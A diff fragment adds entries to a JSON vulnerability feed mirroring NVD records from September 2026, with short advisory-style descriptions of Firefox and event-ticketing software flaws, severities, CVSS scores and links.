+      "desc": "Privilege escalation in the Address Bar component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, and Firefox ESR 140.17.",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100820",
+      "cvss": "8.8",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100821",
+      "desc": "Site isolation issue in the Panning and Zooming component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, Firefox ESR 115.42, and Firefox ESR 140.17.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100821",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100822",
+      "desc": "Spoofing issue in the Networking: HTTP component. This vulnerability was fixed in Firefox ESR 153.4 and Firefox 157.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100822",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100823",
+      "desc": "Spoofing issue in the Downloads component in Firefox for Android. This vulnerability was fixed in Firefox 157.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100823",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100824",
+      "desc": "Privilege escalation in the Places component. This vulnerability was fixed in Firefox ESR 153.4 and Firefox 157.",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100824",
+      "cvss": "8.8",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100825",
+      "desc": "Use-after-free in the JavaScript Engine: JIT component. This vulnerability was fixed in Firefox ESR 153.4 and Firefox 157.",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100825",
+      "cvss": "8.8",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100826",
+      "desc": "Denial-of-service in the Storage: StorageManager component. This vulnerability was fixed in Firefox ESR 153.4 and Firefox 157.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100826",
+      "cvss": "6.5",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100828",
+      "desc": "Mitigation bypass in the Bookmarks & History component. This vulnerability was fixed in Firefox ESR 153.4 and Firefox 157.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100828",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100829",
+      "desc": "Mitigation bypass in the DOM: Security component. This vulnerability was fixed in Firefox ESR 153.4 and Firefox 157.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100829",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100830",
+      "desc": "Mitigation bypass in the DOM: Navigation component. This vulnerability was fixed in Firefox ESR 153.4 and Firefox 157.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100830",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100831",
+      "desc": "Use-after-free in the DOM: UI Events & Focus Handling component. This vulnerability was fixed in Firefox ESR 153.4 and Firefox 157.",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100831",
+      "cvss": "8.8",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100832",
+      "desc": "Use-after-free in the Graphics: Canvas2D component. This vulnerability was fixed in Firefox ESR 153.4, Firefox ESR 115.42, and Firefox ESR 140.17.",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100832",
+      "cvss": "8.8",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-101267",
+      "desc": "A missing permission check allowed low-privileged users with access to an event but without access to the event's orders to extract some specific information. This information includes the number of attendees and the total revenue.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-101267",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-101268",
+      "desc": "If an attacker is able to convince a victim on a specially crafted link, the victim is logged in to the attacker's customer account. If the victim does not notice this, this might lead to their order details being stored into the attacker's account. The attack only works when the event is available on a different domain than the organizer page.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-101268",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-101269",
+      "desc": "The mechanism binding API-uploaded files to the uploader's authentication method is not working correctly and the same session token is used for all token-based API users. Since API-uploaded files are refered to by randomly generated UUIDs and only exist for a day, there is virtually no risk, but it renders the added protection mechanism useless.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-101269",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-101270",
+      "desc": "Malicious HTML content could be injected into the help texts of various fields with organizer permissions.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-101270",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-101271",
+      "desc": "OAuth credentials (access tokens) are valid for the entirety of their lifetime, even if the application (OAuth client) they are bound to is manually disabled.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-101271",
+      "cvss": "0.0",
       "cwe": ""
     },
     {
